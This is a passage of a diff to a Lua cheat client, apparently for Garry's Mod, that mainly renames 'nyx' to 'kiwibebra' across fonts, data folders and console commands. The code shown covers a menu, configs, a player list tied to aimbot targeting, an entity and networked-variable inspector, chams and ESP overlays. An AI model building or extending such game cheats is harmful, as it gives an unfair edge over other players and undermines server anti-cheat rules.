@@ -12395,14 +13410,14 @@ function ESPL.OpenEditor()
             surface.DrawRect(x, y, tw, 18)
             surface.SetDrawColor(e.id == ESPL.sel and C.accent or C.groupBorder)
             surface.DrawOutlinedRect(x, y, tw, 18, 1)
-            draw.SimpleText(e.label, "NyxUI", x + tw / 2, y + 9, hov and C.textHi or C.text, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
+            draw.SimpleText(e.label, "KiwibebraUI", x + tw / 2, y + 9, hov and C.textHi or C.text, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
 
             chips[#chips + 1] = {id = e.id, x = x, y = y, w = tw, h = 18}
             x = x + tw + 6
         end
 
         if #chips == 0 then
-            draw.SimpleText("drop an element here to switch it off", "NyxUISmall", w / 2, h / 2 + 8, C.textDim, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
+            draw.SimpleText("drop an element here to switch it off", "KiwibebraUISmall", w / 2, h / 2 + 8, C.textDim, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
         end
         self.chips = chips
     end
@@ -12428,13 +13443,13 @@ function ESPL.OpenEditor()
         if not d then return end
         local lx, ly = self:ScreenToLocal(gui.MouseX(), gui.MouseY())
         local label = ESPL.BYID[d.id].label
-        surface.SetFont("NyxUI")
+        surface.SetFont("KiwibebraUI")
         local tw = surface.GetTextSize(label) + 12
         surface.SetDrawColor(C.fieldHover)
         surface.DrawRect(lx + 10, ly + 6, tw, 18)
         surface.SetDrawColor(C.accent)
         surface.DrawOutlinedRect(lx + 10, ly + 6, tw, 18, 1)
-        draw.SimpleText(label, "NyxUI", lx + 10 + tw / 2, ly + 15, C.textHi, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
+        draw.SimpleText(label, "KiwibebraUI", lx + 10 + tw / 2, ly + 15, C.textHi, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
     end
 
     f.Think = function(self)
@@ -12503,15 +13518,15 @@ end
 
 -- background -------------------------------------------------------------------
 -- A picture behind the whole menu, animated. The bundled one (a point-cloud wave) is written to
--- data/nyx/bg/ on first run; anything else dropped into that folder (png / jpg) shows up in the
--- list, or can be fetched with the console command  nyx_bg_url <link> [name].
+-- data/kiwibebra/bg/ on first run; anything else dropped into that folder (png / jpg) shows up in the
+-- list, or can be fetched with the console command  kiwibebra_bg_url <link> [name].
 -- Like the configs, it lives in its own block and only exports BG.
 
 local BG = {}
 
 do
-    local DIR = "nyx/bg"
-    local DEFAULT_FILE = "nyx_wave.jpg"
+    local DIR = "kiwibebra/bg"
+    local DEFAULT_FILE = "kiwibebra_wave.jpg"
     local PER_PAGE = 6
 
     -- the bundled picture, base64 of a jpeg
@@ -13158,7 +14173,7 @@ do
     end
 
     local function EnsureDefault()
-        file.CreateDir("nyx")
+        file.CreateDir("kiwibebra")
         file.CreateDir(DIR)
 
         local path = DIR .. "/" .. DEFAULT_FILE
@@ -13345,7 +14360,7 @@ do
 
         p.Paint = function(self, w, h)
             local pages = math.max(1, math.ceil(#files / PER_PAGE))
-            draw.SimpleText(string.format("Picture  (%d / %d)", page, pages), "NyxUI", 0, 0, C.text, TEXT_ALIGN_LEFT, TEXT_ALIGN_TOP)
+            draw.SimpleText(string.format("Picture  (%d / %d)", page, pages), "KiwibebraUI", 0, 0, C.text, TEXT_ALIGN_LEFT, TEXT_ALIGN_TOP)
 
             surface.SetDrawColor(C.field)
             surface.DrawRect(0, 16, w, h - 16)
@@ -13370,7 +14385,7 @@ do
                     col = C.textHi
                 end
 
-                draw.SimpleText(string.sub(name, 1, 30), "NyxUI", 8, 16 + 4 + (i - 1) * rowH, col, TEXT_ALIGN_LEFT, TEXT_ALIGN_TOP)
+                draw.SimpleText(string.sub(name, 1, 30), "KiwibebraUI", 8, 16 + 4 + (i - 1) * rowH, col, TEXT_ALIGN_LEFT, TEXT_ALIGN_TOP)
             end
         end
 
@@ -13398,28 +14413,28 @@ do
         status = "deleted " .. name
     end
 
-    concommand.Add("nyx_bg_url", function(ply, cmd, args)
+    concommand.Add("kiwibebra_bg_url", function(ply, cmd, args)
         if not args[1] or args[1] == "" then
-            print("usage: nyx_bg_url <link to a png / jpg> [name]")
+            print("usage: kiwibebra_bg_url <link to a png / jpg> [name]")
             return
         end
 
         BG.Download(args[1], args[2])
     end)
 
-    concommand.Add("nyx_bg", function(ply, cmd, args)
+    concommand.Add("kiwibebra_bg", function(ply, cmd, args)
         local name = args[1]
         if not name or not table.HasValue(files, name) then
-            print("[nyx] no such picture, see nyx_bg_list")
+            print("[kiwibebra] no such picture, see kiwibebra_bg_list")
             return
         end
 
         BG.Select(name)
     end)
 
-    concommand.Add("nyx_bg_list", function()
+    concommand.Add("kiwibebra_bg_list", function()
         BG.Refresh()
-        print("[nyx] pictures in data/" .. DIR .. ":")
+        print("[kiwibebra] pictures in data/" .. DIR .. ":")
         for _, f in ipairs(files) do print("   " .. f) end
     end)
 
@@ -13429,7 +14444,7 @@ end
 -- sky picture -------------------------------------------------------------------
 -- Your own picture as the sky: a sphere around the camera, textured with the picture, drawn
 -- right after the engine's 2D sky (so it covers whatever the map or an env_skypaint drew).
--- The pictures come from the same folder as the menu background, data/nyx/bg/. A normal photo
+-- The pictures come from the same folder as the menu background, data/kiwibebra/bg/. A normal photo
 -- gets wrapped around the full 360 degrees; a 2:1 panorama looks right as it is.
 
 local SKYPIC = {status = "pick a picture"}
@@ -13467,10 +14482,10 @@ do
         return SKYPIC.status
     end
 
-    -- nyx_sky_url <link to a png / jpg> [name]: fetch a picture and put it on the sky
-    concommand.Add("nyx_sky_url", function(ply, cmd, args)
+    -- kiwibebra_sky_url <link to a png / jpg> [name]: fetch a picture and put it on the sky
+    concommand.Add("kiwibebra_sky_url", function(ply, cmd, args)
         if not args[1] or args[1] == "" then
-            print("usage: nyx_sky_url <link to a png / jpg> [name]")
+            print("usage: kiwibebra_sky_url <link to a png / jpg> [name]")
             return
         end
 
@@ -13479,19 +14494,20 @@ do
 end
 
 -- configs ---------------------------------------------------------------------
--- Every config is a file of its own: data/nyx/configs/<name>.json, every setting plus the
+-- Every config is a file of its own: data/kiwibebra/configs/<name>.json, every setting plus the
 -- feature binds. The Config tab lists that folder (files copied in by hand show up after
--- Refresh), saves under the name typed in, and opens the folder in Explorer (gmcl_nyx v4).
--- The console commands nyx_config_save / nyx_config_load / nyx_config_list use the same files.
+-- Refresh), saves under the name typed in, and opens the folder in Explorer (gmcl_kiwibebra v4).
+-- The console commands kiwibebra_config_save / kiwibebra_config_load / kiwibebra_config_list use the same files.
 
 -- The whole system sits in its own block and only exports CFGS: the file is close to Lua's limit
 -- of 200 local variables in one chunk, and nothing in here has to stay in scope afterwards.
 local CFGS = {}
 
 do
-local CONFIG_DIR = "nyx/configs"
+local CONFIG_DIR = "kiwibebra/configs"
 
 local defaultCfg = table.Copy(cfg)       -- what "Reset" goes back to (nothing has been touched yet)
+CFGS.defaultLayout = defaultCfg.menu.layout   -- for the menu's "Reset group layout"
 local configStatus = "ready"
 local configList = {}                    -- {name, time}, newest first
 local selected = nil                     -- the config picked in the list
@@ -13518,18 +14534,18 @@ local function RefreshList()
 end
 
 -- Older versions kept the configs (config_1 .. config_10 and console-saved names) straight in
--- data/nyx/, next to players.json and the rest. Every json there that is a config gets moved
+-- data/kiwibebra/, next to players.json and the rest. Every json there that is a config gets moved
 -- into configs/ once; the old file only goes after the copy reads back the same.
 do
     file.CreateDir(CONFIG_DIR)
-    for _, f in ipairs(file.Find("nyx/*.json", "DATA") or {}) do
-        local raw = file.Read("nyx/" .. f, "DATA")
+    for _, f in ipairs(file.Find("kiwibebra/*.json", "DATA") or {}) do
+        local raw = file.Read("kiwibebra/" .. f, "DATA")
         local data = raw and util.JSONToTable(raw)
 
         if istable(data) and istable(data.cfg) and data.version then
             local dst = CONFIG_DIR .. "/" .. f
             if not file.Exists(dst, "DATA") then file.Write(dst, raw) end
-            if file.Read(dst, "DATA") == raw then file.Delete("nyx/" .. f) end
+            if file.Read(dst, "DATA") == raw then file.Delete("kiwibebra/" .. f) end
         end
     end
 end
@@ -13622,7 +14638,7 @@ local function EditName(p)
     local x, y = p:LocalToScreen(0, 0)
     te:SetPos(x + 1, y + 1)
     te:SetSize(p:GetWide() - 2, p:GetTall() - 2)
-    te:SetFont("NyxUI")
+    te:SetFont("KiwibebraUI")
     te:SetText(typed)
     te:SetUpdateOnType(true)
     te:MakePopup()
@@ -13697,9 +14713,9 @@ local function AddNameField(g)
 
         if not editing then
             if typed == "" then
-                draw.SimpleText("config name", "NyxUI", 6, h / 2, C.textDim, TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER)
+                draw.SimpleText("config name", "KiwibebraUI", 6, h / 2, C.textDim, TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER)
             else
-                draw.SimpleText(typed, "NyxUI", 6, h / 2, C.textHi, TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER)
+                draw.SimpleText(typed, "KiwibebraUI", 6, h / 2, C.textHi, TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER)
             end
         end
     end
@@ -13752,12 +14768,12 @@ local function AddConfigList(g, rows)
                 col = C.textHi
             end
 
-            draw.SimpleText(it.name, "NyxUI", 8, y + rowH / 2, col, TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER)
-            draw.SimpleText(os.date("%d.%m %H:%M", it.time), "NyxUISmall", w - 8, y + rowH / 2, C.textDim, TEXT_ALIGN_RIGHT, TEXT_ALIGN_CENTER)
+            draw.SimpleText(it.name, "KiwibebraUI", 8, y + rowH / 2, col, TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER)
+            draw.SimpleText(os.date("%d.%m %H:%M", it.time), "KiwibebraUISmall", w - 8, y + rowH / 2, C.textDim, TEXT_ALIGN_RIGHT, TEXT_ALIGN_CENTER)
         end
 
         if #configList == 0 then
-            draw.SimpleText("no configs yet", "NyxUI", w / 2, h / 2, C.textDim, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
+            draw.SimpleText("no configs yet", "KiwibebraUI", w / 2, h / 2, C.textDim, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
         end
 
         -- scroll bar
@@ -13792,27 +14808,27 @@ local function AddConfigList(g, rows)
     end
 end
 
-concommand.Add("nyx_config_save", function(ply, cmd, args)
+concommand.Add("kiwibebra_config_save", function(ply, cmd, args)
     local name = CleanName(args[1])
-    if name == "" then print("usage: nyx_config_save <name>") return end
+    if name == "" then print("usage: kiwibebra_config_save <name>") return end
 
     SaveConfig(name)
     configStatus = "saved " .. name
-    print("[nyx] saved " .. ConfigPath(name))
+    print("[kiwibebra] saved " .. ConfigPath(name))
 end)
 
-concommand.Add("nyx_config_load", function(ply, cmd, args)
+concommand.Add("kiwibebra_config_load", function(ply, cmd, args)
     local name = CleanName(args[1])
-    if name == "" then print("usage: nyx_config_load <name>") return end
+    if name == "" then print("usage: kiwibebra_config_load <name>") return end
 
     local ok, why = LoadConfig(name)
     configStatus = ok and ("loaded " .. name) or (name .. ": " .. why)
-    print("[nyx] " .. configStatus)
+    print("[kiwibebra] " .. configStatus)
 end)
 
-concommand.Add("nyx_config_list", function()
+concommand.Add("kiwibebra_config_list", function()
     local files = file.Find(CONFIG_DIR .. "/*.json", "DATA")
-    print("[nyx] configs in data/" .. CONFIG_DIR .. ":")
+    print("[kiwibebra] configs in data/" .. CONFIG_DIR .. ":")
     for _, f in ipairs(files) do print("   " .. string.StripExtension(f)) end
 end)
 
@@ -13870,20 +14886,35 @@ CFGS.Refresh = function()
     configStatus = #configList .. " config" .. (#configList == 1 and "" or "s")
 end
 
--- Explorer on data/nyx/configs (gmcl_nyx v4); without it the path goes to the clipboard
+-- Explorer on data/kiwibebra/configs (gmcl_kiwibebra v4); without it the path goes to the clipboard
 CFGS.OpenFolder = function()
     file.CreateDir(CONFIG_DIR)
 
-    if istable(nyxmod) and isfunction(nyxmod.OpenFolder) then
-        local ok, why = nyxmod.OpenFolder(CONFIG_DIR)
-        configStatus = ok and ("opened data/" .. CONFIG_DIR) or ("can't open: " .. tostring(why))
+    -- every outcome also pops up as a notification (the menu's status lines aren't drawn)
+    local function Tell(text, kind)
+        configStatus = text
+        notification.AddLegacy(text, kind or NOTIFY_GENERIC, 4)
+    end
+
+    if istable(kiwibebramod) and isfunction(kiwibebramod.OpenFolder) then
+        local ok, why = kiwibebramod.OpenFolder(CONFIG_DIR)
+        if ok then
+            Tell("Opened data/" .. CONFIG_DIR .. " (Explorer, alt-tab if it is behind the game)")
+        else
+            Tell("Can't open the configs folder: " .. tostring(why), NOTIFY_ERROR)
+        end
         return
     end
 
     local full = isfunction(util.RelativePathToFull) and util.RelativePathToFull("data/" .. CONFIG_DIR) or ""
     if full == "" then full = "garrysmod/data/" .. CONFIG_DIR end
     SetClipboardText(full)
-    configStatus = "needs gmcl_nyx v4 - path copied"
+
+    if istable(kiwibebramod) then
+        Tell("gmcl_kiwibebra v" .. tostring(kiwibebramod.version) .. " is too old (needs v4+) - path copied", NOTIFY_ERROR)
+    else
+        Tell("gmcl_kiwibebra is not loaded (lua/bin) - folder path copied to clipboard", NOTIFY_ERROR)
+    end
 end
 
 CFGS.Reset = function()
@@ -13901,13 +14932,13 @@ end   -- configs
 -- for just that player, steam / team / group / language / position info.
 --   friend : never picked by the aimbots, drawn green
 --   target : drawn red, picked first, and the only ones when "Target only" is on
--- Everything is kept in data/nyx/players.json (read once on load), independent of the configs.
+-- Everything is kept in data/kiwibebra/players.json (read once on load), independent of the configs.
 
 local PL = {}
 
 do
-    local FILE = "nyx/players.json"
-    local OLD_FILE = "nyx/friends.json"          -- first version of the list: friends only
+    local FILE = "kiwibebra/players.json"
+    local OLD_FILE = "kiwibebra/friends.json"          -- first version of the list: friends only
     local PER_PAGE = 22
 
     local selKey = nil                           -- key (SteamID64 / bot nick) of the selected player
@@ -13934,7 +14965,7 @@ do
             }
         end
 
-        file.CreateDir("nyx")
+        file.CreateDir("kiwibebra")
         file.Write(FILE, util.TableToJSON(out))
     end
 
@@ -14072,7 +15103,7 @@ do
             local pages = math.max(1, math.ceil(#rows / PER_PAGE))
             if page > pages then page = pages end
 
-            draw.SimpleText(string.format("Players  (%d / %d)", page, pages), "NyxUI", 0, 0, C.text, TEXT_ALIGN_LEFT, TEXT_ALIGN_TOP)
+            draw.SimpleText(string.format("Players  (%d / %d)", page, pages), "KiwibebraUI", 0, 0, C.text, TEXT_ALIGN_LEFT, TEXT_ALIGN_TOP)
 
             surface.SetDrawColor(C.field)
             surface.DrawRect(0, 16, w, h - 16)
@@ -14110,7 +15141,7 @@ do
                     if col == C.textDim then col = C.textHi end
                 end
 
-                draw.SimpleText(string.sub(row.text, 1, 28), "NyxUI", 8, y, col, TEXT_ALIGN_LEFT, TEXT_ALIGN_TOP)
+                draw.SimpleText(string.sub(row.text, 1, 28), "KiwibebraUI", 8, y, col, TEXT_ALIGN_LEFT, TEXT_ALIGN_TOP)
             end
         end
 
@@ -14155,8 +15186,8 @@ do
         end
 
         local function Line(self, label, value, x, y, col)
-            draw.SimpleText(label, "NyxUISmall", x, y, C.textDim, TEXT_ALIGN_LEFT, TEXT_ALIGN_TOP)
-            draw.SimpleText(value, "NyxUISmall", x + 78, y, col or C.text, TEXT_ALIGN_LEFT, TEXT_ALIGN_TOP)
+            draw.SimpleText(label, "KiwibebraUISmall", x, y, C.textDim, TEXT_ALIGN_LEFT, TEXT_ALIGN_TOP)
+            draw.SimpleText(value, "KiwibebraUISmall", x + 78, y, col or C.text, TEXT_ALIGN_LEFT, TEXT_ALIGN_TOP)
         end
 
         p.Paint = function(self, w, h)
@@ -14165,7 +15196,7 @@ do
 
             local v = PlayerByKey(selKey)
             if not v then
-                draw.SimpleText("Select a player in the list", "NyxUI", 74, 24, C.textDim, TEXT_ALIGN_LEFT, TEXT_ALIGN_TOP)
+                draw.SimpleText("Select a player in the list", "KiwibebraUI", 74, 24, C.textDim, TEXT_ALIGN_LEFT, TEXT_ALIGN_TOP)
                 return
             end
 
@@ -14183,7 +15214,7 @@ do
             if not lang or lang == "" then lang = "unknown" end
 
             -- next to the avatar
-            draw.SimpleText(v:Nick(), "NyxUIBold", 74, 0, nameCol, TEXT_ALIGN_LEFT, TEXT_ALIGN_TOP)
+            draw.SimpleText(v:Nick(), "KiwibebraUIBold", 74, 0, nameCol, TEXT_ALIGN_LEFT, TEXT_ALIGN_TOP)
             Line(self, "SteamID64", v:SteamID64() or "bot", 74, 17)
             Line(self, "SteamID", v:SteamID(), 74, 31)
             Line(self, "Team", string.format("%s (%d)", team.GetName(v:Team()), v:Team()), 74, 45, tcol)
@@ -14327,7 +15358,7 @@ do
     -- grouping, names, entity chams --------------------------------------------------------
     -- Entities of the same kind (MV.EntKey) collapse into one row "name  xN" that opens on a
     -- click. Right click on any row: chams on that entity / on every one of its kind, rename.
-    -- Names and per-kind chams are saved in data/nyx/entities.json; chams on one entity only
+    -- Names and per-kind chams are saved in data/kiwibebra/entities.json; chams on one entity only
     -- last as long as it exists (entity indices are reused).
     EV.chamEnt = setmetatable({}, {__mode = "k"})   -- entity -> true
     EV.chamKind = {}                                 -- MV.EntKey -> true
@@ -14335,7 +15366,7 @@ do
     EV.espKind = {}
     EV.expanded = {}                                 -- group key -> true
     EV.total = 0
-    EV.DATA_FILE = "nyx/entities.json"     -- a field, not a local: this block shares the main chunk's 200
+    EV.DATA_FILE = "kiwibebra/entities.json"     -- a field, not a local: this block shares the main chunk's 200
 
     function EV.SaveData()
         local names, kinds, esp = {}, {}, {}
@@ -14343,7 +15374,7 @@ do
         for k in pairs(EV.chamKind) do kinds[#kinds + 1] = k end
         for k in pairs(EV.espKind) do esp[#esp + 1] = k end
 
-        file.CreateDir("nyx")
+        file.CreateDir("kiwibebra")
         file.Write(EV.DATA_FILE, util.TableToJSON({names = names, chams = kinds, esp = esp}, true))
     end
 
@@ -14653,7 +15684,7 @@ do
         return list
     end
 
-    -- data/nyx/nwvars.txt: a summary of every name, then every entity with its vars
+    -- data/kiwibebra/nwvars.txt: a summary of every name, then every entity with its vars
     function EV.DumpVars()
         local lines, names = {}, {}
 
@@ -14680,17 +15711,17 @@ do
         local head = {"-- every NWVar, by how many entities have it"}
         for _, k in ipairs(keys) do head[#head + 1] = string.format("%5d  %s", names[k], k) end
 
-        file.CreateDir("nyx")
-        file.Write("nyx/nwvars.txt", table.concat(head, "\n") .. "\n\n" .. table.concat(lines, "\n"))
+        file.CreateDir("kiwibebra")
+        file.Write("kiwibebra/nwvars.txt", table.concat(head, "\n") .. "\n\n" .. table.concat(lines, "\n"))
 
-        EV.status = string.format("%d names dumped to data/nyx/nwvars.txt", #keys)
+        EV.status = string.format("%d names dumped to data/kiwibebra/nwvars.txt", #keys)
         return #keys
     end
 
-    -- nyx_nwvars [entindex | all]: no argument = what is under the crosshair
-    concommand.Add("nyx_nwvars", function(_, _, args)
+    -- kiwibebra_nwvars [entindex | all]: no argument = what is under the crosshair
+    concommand.Add("kiwibebra_nwvars", function(_, _, args)
         if args[1] == "all" then
-            print("[nyx] " .. EV.DumpVars() .. " names -> data/nyx/nwvars.txt")
+            print("[kiwibebra] " .. EV.DumpVars() .. " names -> data/kiwibebra/nwvars.txt")
             return
         end
 
@@ -14699,9 +15730,9 @@ do
             local me = LocalPlayer()
             e = IsValid(me) and me:GetEyeTrace().Entity
         end
-        if not IsValid(e) then print("[nyx] no entity") return end
+        if not IsValid(e) then print("[kiwibebra] no entity") return end
 
-        print(string.format("[nyx] %s #%d", e:GetClass(), e:EntIndex()))
+        print(string.format("[kiwibebra] %s #%d", e:GetClass(), e:EntIndex()))
         for _, v in ipairs(EV.NWVars(e)) do print(string.format("    [%s] %s = %s", v.kind, v.name, v.text)) end
     end)
 
@@ -14814,7 +15845,7 @@ do
         local x, y = p:LocalToScreen(0, 0)
         te:SetPos(x + 1, y + 1)
         te:SetSize(p:GetWide() - 20, p:GetTall() - 2)
-        te:SetFont("NyxUI")
+        te:SetFont("KiwibebraUI")
         te:SetText(EV.search)
         te:SetUpdateOnType(true)
         if te.SetAllowNonAsciiCharacters then te:SetAllowNonAsciiCharacters(true) end
@@ -14888,14 +15919,14 @@ do
             if not editing then
                 if EV.search == "" then
                     draw.SimpleText(ev.searchNW and "search: name, class, model, #id, nwvars" or "search: name, class, model, #id",
-                        "NyxUI", 6, h / 2, C.textDim, TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER)
+                        "KiwibebraUI", 6, h / 2, C.textDim, TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER)
                 else
-                    draw.SimpleText(EV.search, "NyxUI", 6, h / 2, C.textHi, TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER)
+                    draw.SimpleText(EV.search, "KiwibebraUI", 6, h / 2, C.textHi, TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER)
                 end
             end
 
             if EV.search ~= "" then
-                draw.SimpleText("x", "NyxUIBold", w - 9, h / 2, C.textDim, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
+                draw.SimpleText("x", "KiwibebraUIBold", w - 9, h / 2, C.textDim, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
             end
         end
 
@@ -14986,7 +16017,7 @@ do
                 b.msg = "copied " .. #out .. " lines"
             end},
             {128, PH - 28, 180, 20, "Dump all to nwvars.txt", function()
-                b.msg = EV.DumpVars() .. " names -> data/nyx/nwvars.txt"
+                b.msg = EV.DumpVars() .. " names -> data/kiwibebra/nwvars.txt"
             end},
             {PW - 82, PH - 28, 70, 20, "Close", function() b:Remove() end},
         }
@@ -15030,7 +16061,7 @@ do
             surface.SetDrawColor(C.groupBorder)
             surface.DrawOutlinedRect(0, 0, w, h, 1)
 
-            draw.SimpleText(self.title or "", "NyxUIBold", 12, 7, C.textHi, TEXT_ALIGN_LEFT, TEXT_ALIGN_TOP)
+            draw.SimpleText(self.title or "", "KiwibebraUIBold", 12, 7, C.textHi, TEXT_ALIGN_LEFT, TEXT_ALIGN_TOP)
 
             local mx, my = self:CursorPos()
 
@@ -15038,7 +16069,7 @@ do
                 local on = a[7]()
                 surface.SetDrawColor(on and C.accent or (Inside(a, mx, my) and C.textDim or C.groupBorder))
                 surface.DrawOutlinedRect(a[1], a[2], a[3], a[4], 1)
-                draw.SimpleText(a[5], "NyxUI", a[1] + a[3] / 2, a[2] + a[4] / 2, on and C.textHi or C.text, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
+                draw.SimpleText(a[5], "KiwibebraUI", a[1] + a[3] / 2, a[2] + a[4] / 2, on and C.textHi or C.text, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
             end
 
             -- list
@@ -15050,7 +16081,7 @@ do
 
             if #self.rows == 0 then
                 draw.SimpleText(self.mode == "sel" and "no networked vars (or nothing selected)" or "no NWVars on the map",
-                    "NyxUI", w / 2, listY + listH / 2, C.textDim, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
+                    "KiwibebraUI", w / 2, listY + listH / 2, C.textDim, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
             end
 
             local hover = (mx > 12 and mx < w - 12 and my > listY and my < listY + listH)
@@ -15067,14 +16098,14 @@ do
                 end
 
                 local kindCol = v.kind == "DT" and C.accent or (v.kind == "NW" and Color(90, 200, 255) or Color(255, 190, 70))
-                draw.SimpleText(v.kind, "NyxUISmall", 18, y + 2, kindCol, TEXT_ALIGN_LEFT, TEXT_ALIGN_TOP)
-                draw.SimpleText(string.sub(v.name, 1, 28), "NyxUI", 52, y + 1, C.textHi, TEXT_ALIGN_LEFT, TEXT_ALIGN_TOP)
+                draw.SimpleText(v.kind, "KiwibebraUISmall", 18, y + 2, kindCol, TEXT_ALIGN_LEFT, TEXT_ALIGN_TOP)
+                draw.SimpleText(string.sub(v.name, 1, 28), "KiwibebraUI", 52, y + 1, C.textHi, TEXT_ALIGN_LEFT, TEXT_ALIGN_TOP)
 
                 if self.mode == "all" then
-                    draw.SimpleText("x" .. v.count, "NyxUISmall", 250, y + 2, C.accent, TEXT_ALIGN_LEFT, TEXT_ALIGN_TOP)
-                    draw.SimpleText(string.sub(v.text, 1, 46), "NyxUI", 292, y + 1, C.text, TEXT_ALIGN_LEFT, TEXT_ALIGN_TOP)
+                    draw.SimpleText("x" .. v.count, "KiwibebraUISmall", 250, y + 2, C.accent, TEXT_ALIGN_LEFT, TEXT_ALIGN_TOP)
+                    draw.SimpleText(string.sub(v.text, 1, 46), "KiwibebraUI", 292, y + 1, C.text, TEXT_ALIGN_LEFT, TEXT_ALIGN_TOP)
                 else
-                    draw.SimpleText(string.sub(v.text, 1, 52), "NyxUI", 250, y + 1, C.text, TEXT_ALIGN_LEFT, TEXT_ALIGN_TOP)
+                    draw.SimpleText(string.sub(v.text, 1, 52), "KiwibebraUI", 250, y + 1, C.text, TEXT_ALIGN_LEFT, TEXT_ALIGN_TOP)
                 end
             end
 
@@ -15092,10 +16123,10 @@ do
                 surface.DrawRect(a[1], a[2], a[3], a[4])
                 surface.SetDrawColor(Inside(a, mx, my) and C.accent or C.groupBorder)
                 surface.DrawOutlinedRect(a[1], a[2], a[3], a[4], 1)
-                draw.SimpleText(a[5], "NyxUI", a[1] + a[3] / 2, a[2] + a[4] / 2, C.text, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
+                draw.SimpleText(a[5], "KiwibebraUI", a[1] + a[3] / 2, a[2] + a[4] / 2, C.text, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
             end
 
-            draw.SimpleText(self.msg, "NyxUISmall", 316, h - 18, C.textDim, TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER)
+            draw.SimpleText(self.msg, "KiwibebraUISmall", 316, h - 18, C.textDim, TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER)
         end
 
         b.OnMousePressed = function(self, code)
@@ -15227,7 +16258,7 @@ do
             if ev.espName then
                 local key = MV.EntKey(e)
                 local name = (key and MV.entNames[key]) or (e:IsPlayer() and e:Nick()) or WorldLabel(e, WorldCategory(e))
-                draw.SimpleTextOutlined(name, "NyxESP", x + w / 2, y - 3, col, TEXT_ALIGN_CENTER, TEXT_ALIGN_BOTTOM, 1, COL_BLACK)
+                draw.SimpleTextOutlined(name, "KiwibebraESP", x + w / 2, y - 3, col, TEXT_ALIGN_CENTER, TEXT_ALIGN_BOTTOM, 1, COL_BLACK)
             end
 
             local lineY = y + h + 2
@@ -15243,14 +16274,14 @@ do
                     surface.SetDrawColor(math.floor(255 * (1 - f)), math.floor(255 * f), 40, 255)
                     surface.DrawRect(x - 5, y + bh * (1 - f), 2, bh * f)
 
-                    draw.SimpleTextOutlined(math.floor(hp) .. " hp", "NyxESP", x + w / 2, lineY, col,
+                    draw.SimpleTextOutlined(math.floor(hp) .. " hp", "KiwibebraESP", x + w / 2, lineY, col,
                         TEXT_ALIGN_CENTER, TEXT_ALIGN_TOP, 1, COL_BLACK)
                     lineY = lineY + 11
                 end
             end
 
             if ev.espDist then
-                draw.SimpleTextOutlined(math.floor(metres) .. "m", "NyxESP", x + w / 2, lineY, col,
+                draw.SimpleTextOutlined(math.floor(metres) .. "m", "KiwibebraESP", x + w / 2, lineY, col,
                     TEXT_ALIGN_CENTER, TEXT_ALIGN_TOP, 1, COL_BLACK)
             end
         end
@@ -15333,7 +16364,7 @@ do
             local pages = math.max(1, math.ceil(#list / PER_PAGE))
             if page > pages then page = pages end
 
-            draw.SimpleText(string.format("Entities: %d  (%d / %d)", EV.total, page, pages), "NyxUI", 0, 0, C.text, TEXT_ALIGN_LEFT, TEXT_ALIGN_TOP)
+            draw.SimpleText(string.format("Entities: %d  (%d / %d)", EV.total, page, pages), "KiwibebraUI", 0, 0, C.text, TEXT_ALIGN_LEFT, TEXT_ALIGN_TOP)
 
             surface.SetDrawColor(C.field)
             surface.DrawRect(0, 16, w, h - 16)
@@ -15387,14 +16418,14 @@ do
                     surface.DrawRect(12, y + 6, 6, 1)
                 end
 
-                draw.SimpleText(string.sub(text, 1, maxLen), "NyxUI", x, y, col, TEXT_ALIGN_LEFT, TEXT_ALIGN_TOP)
+                draw.SimpleText(string.sub(text, 1, maxLen), "KiwibebraUI", x, y, col, TEXT_ALIGN_LEFT, TEXT_ALIGN_TOP)
 
                 local right = w - 6
-                draw.SimpleText((r.group and "~" or "") .. math.floor(r.dist * 0.01905) .. "m", "NyxUISmall", right, y + 1, C.textDim, TEXT_ALIGN_RIGHT, TEXT_ALIGN_TOP)
+                draw.SimpleText((r.group and "~" or "") .. math.floor(r.dist * 0.01905) .. "m", "KiwibebraUISmall", right, y + 1, C.textDim, TEXT_ALIGN_RIGHT, TEXT_ALIGN_TOP)
                 right = right - 36
 
                 if r.group then
-                    draw.SimpleText("x" .. r.count, "NyxUISmall", right, y + 1, C.accent, TEXT_ALIGN_RIGHT, TEXT_ALIGN_TOP)
+                    draw.SimpleText("x" .. r.count, "KiwibebraUISmall", right, y + 1, C.accent, TEXT_ALIGN_RIGHT, TEXT_ALIGN_TOP)
                     right = right - 30
                 end
 
@@ -15457,8 +16488,8 @@ do
             surface.SetDrawColor(C.groupBorder)
             surface.DrawOutlinedRect(0, 0, w, h, 1)
 
-            draw.SimpleText("Show", "NyxUI", 8, h / 2, C.text, TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER)
-            draw.SimpleText("< " .. FILTERS[Index()][1] .. " >", "NyxUI", w - 8, h / 2, C.accent, TEXT_ALIGN_RIGHT, TEXT_ALIGN_CENTER)
+            draw.SimpleText("Show", "KiwibebraUI", 8, h / 2, C.text, TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER)
